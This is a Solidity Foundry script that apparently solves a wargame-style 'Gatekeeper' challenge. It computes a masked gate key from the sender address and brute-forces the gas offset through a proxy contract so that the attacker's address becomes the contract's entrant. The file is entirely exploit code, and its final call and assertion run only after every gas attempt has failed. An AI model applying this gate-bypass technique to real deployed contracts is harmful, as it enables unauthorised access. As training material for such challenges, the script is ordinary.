// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GK} from "../src/GK.sol";
import {GKCaller} from "../src/GK.e.sol";

contract GKScript is Script {
    GK public gk;
    GKCaller private caller;

    function setUp() public {
        gk = GK(vm.envAddress("TARGET_CONTRACT_ADDRESS"));
    }

    function run() public {
        vm.startBroadcast();

        caller = new GKCaller(address(gk));

        uint64 uintKey = uint64(uint160(address(msg.sender)));
        bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;

        uint256 required_gas = 0;
        for (uint256 i = 0; i <= 81910; i++) {
            // Try different gas values, adjusted by i
            try caller.proxy(8191 * 2 + i, key) {
                console.log("Gas required ->", i);
                required_gas = 8191 * 2 + i;
                return; // success
            } catch {}
        }

        caller.proxy(required_gas, key);
        assert(gk.entrant() == msg.sender);


        vm.stopBroadcast();
    }
}
